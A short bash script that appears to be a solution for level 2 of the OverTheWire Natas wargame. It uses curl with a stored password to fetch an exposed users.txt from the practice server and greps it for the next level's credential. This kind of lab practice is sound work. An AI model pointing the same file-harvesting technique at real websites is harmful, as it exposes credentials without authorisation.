#!/bin/bash

curl -u natas2:$(cat keys/dois) http://natas2.natas.labs.overthewire.org/files/users.txt 2>/dev/null | grep natas3
